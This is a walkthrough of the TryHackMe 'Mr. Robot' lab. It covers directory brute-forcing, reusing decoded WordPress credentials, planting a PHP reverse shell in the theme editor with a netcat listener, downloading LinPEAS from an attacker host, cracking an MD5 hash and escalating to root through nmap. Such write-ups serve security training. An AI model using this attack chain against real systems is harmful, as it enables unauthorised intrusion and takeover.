# Mr. Robot CTF — TryHackMe Walkthrough

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Mr%20Robot-red)](https://tryhackme.com/room/mrrobot)
[![Difficulty](https://img.shields.io/badge/Difficulty-Beginner%2FIntermediate-orange)]()
[![Category](https://img.shields.io/badge/Category-Web%20%7C%20WordPress%20%7C%20PrivEsc-blue)]()

A complete walkthrough of the **Mr. Robot** machine on TryHackMe — a beginner/intermediate boot2root box themed after the TV show, with three hidden flags to capture: enumeration, WordPress exploitation, and Linux privilege escalation.

**Room:** https://tryhackme.com/room/mrrobot
**Target:** `10.128.158.213`
**Credit:** Machine created by [Leon Johnson](https://twitter.com/@sho_luv), used here with permission.

---

## Overview

| Flag | Technique |
|------|-----------|
| Key 1 | Directory brute-forcing, `robots.txt` disclosure |
| Key 2 | WordPress credential discovery, theme-editor reverse shell, password cracking |
| Key 3 | Linux privilege escalation via `linpeas.sh` and GTFOBins (`nmap`) |

**Tools used:** Gobuster, CyberChef, Netcat, LinPEAS, GTFOBins, CrackStation, WordPress Theme Editor

---

## Key 1 — Initial Enumeration

![Landing page](assets/image-01.png)

An initial scan showed three open ports:

- `22` — SSH
- `80` — HTTP
- `443` — HTTPS

Opening the site in a browser revealed the standard landing page:

![Website](assets/image-02.png)

Checking `/robots.txt` directly returned a readable file referencing `fsociety.dic` — a wordlist worth keeping for later:

![robots.txt](assets/image-03.png)

The same path was also surfaced by directory brute-forcing with **Gobuster**:

```bash
gobuster dir -u http://<ip> \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
  -t 100 -q -o scans/gobuster-small.txt
```

![Gobuster results](assets/image-04.png)

A `robots.txt` serving a 200 response on a fresh target is worth a closer look — it often hints at what the admin wants hidden. Replacing `/robots.txt` with the path **`key-1-of-3.txt`** returned the first flag:

![Key 1 path](assets/image-05.png)
![Key 1 found](assets/image-06.png)

---

## Key 2 — WordPress Exploitation

The Gobuster scan also revealed a `/wp-login` endpoint, confirming the site runs WordPress — which opens up the usual enumeration paths. Checking `/license`:

![/license page](assets/image-07.png)

Scrolling down surfaced a base64-encoded string:

![Encoded string](assets/image-08.png)

Decoding `ZWxsaW90OkVSMjgtMDY1Mgo=` in CyberChef gave `elliot:ER28-0652` — a likely username:password pair:

![CyberChef decode](assets/image-09.png)

Using those credentials on `/wp-login`:

- **Username:** `elliot`
- **Password:** `ER28-0652`

![Login page](assets/image-10.png)
![Logged in](assets/image-11.png)

With access to the WordPress dashboard, the theme editor (**Appearance → Editor → `content-page.php`**) allows direct PHP execution — a classic path to a reverse shell:

![Theme editor](assets/image-12.png)

Set up a listener:

```bash
rlwrap nc -lvnp 53
```

Then paste in the [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell), updating the IP and port to match the listener:

![Edited shell IP/port](assets/image-13.png)
![Saved template](assets/image-14.png)
![Template confirmed](assets/image-15.png)

Triggering the shell by requesting the modified template:

```
http://10.128.158.213/wp-content/themes/twentyfifteen/content-page.php
```

![Shell callback](assets/image-16.png)

The initial shell is unstable — `Ctrl+C` kills the whole session — so it's upgraded to a proper TTY:

![Unstable shell](assets/image-17.png)

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Inside `/home/robot`, a password hash was waiting:

```bash
cd /home/robot
cat password.raw-md5
```

![Finding password hash](assets/image-18.png)
![Hash contents](assets/image-19.png)

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracking the MD5 hash via [CrackStation](https://crackstation.net/) recovered the plaintext:

![CrackStation result](assets/image-20.png)

```
abcdefghijklmnopqrstuvwxyz
```

Switching to the `robot` user:

```bash
su robot
# password: abcdefghijklmnopqrstuvwxyz
```

![su robot](assets/image-21.png)

The new shell needed the same TTY upgrade:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

![TTY upgrade again](assets/image-22.png)
![Stable shell](assets/image-23.png)
![Key 2 found](assets/image-24.png)

---

## Key 3 — Privilege Escalation

With a foothold as `robot`, the next step is hunting for a privilege escalation path using **LinPEAS**.

Start a local HTTP server on the attacking machine and fetch `linpeas.sh` onto the target:

```bash
# on attacker (from the PEASS-ng tools directory)
sudo apt install peass

# on target, in /tmp
wget http://192.168.130.34/linpeas.sh
```

![peass install](assets/image-25.png)
![linpeas available](assets/image-26.png)
![Download via wget](assets/image-27.png)
![File on target](assets/image-28.png)

The downloaded script needed execute permissions:

```bash
chmod +x linpeas.sh
./linpeas.sh
```

![chmod +x](assets/image-29.png)
![Running LinPEAS](assets/image-30.png)

LinPEAS flagged `nmap` under **"Files with Interesting Permissions"** — a binary with an exploitable capability/permission. A quick check on [GTFOBins](https://gtfobins.org/) confirmed the escalation path for `nmap`:

![LinPEAS findings](assets/image-31.png)
![GTFOBins nmap page](assets/image-32.png)
![GTFOBins payload](assets/image-33.png)

```bash
nmap --interactive
!sh
```

![Root shell](assets/image-34.png)

With a root shell, the final flag was waiting in `/root`:

```bash
cd /root
cat key-3-of-3.txt
```

![Root flag](assets/image-35.png)
![Key 3 found](assets/image-36.png)

---

## Summary

| Stage | Skill demonstrated |
|-------|---------------------|
| Recon | Port scanning, directory brute-forcing with Gobuster |
| Web | Sensitive file disclosure, base64 decoding, credential reuse |
| Exploitation | WordPress theme-editor RCE, reverse shell handling, TTY upgrades |
| Post-exploitation | Hash cracking, privilege escalation via misconfigured binary capabilities |

![Done 1](assets/image-37.png)
![Done 2](assets/image-38.png)

---

## Disclaimer

This walkthrough documents work performed on a deliberately vulnerable TryHackMe lab machine for educational purposes. None of the techniques here should be used against systems you do not own or have explicit written permission to test.
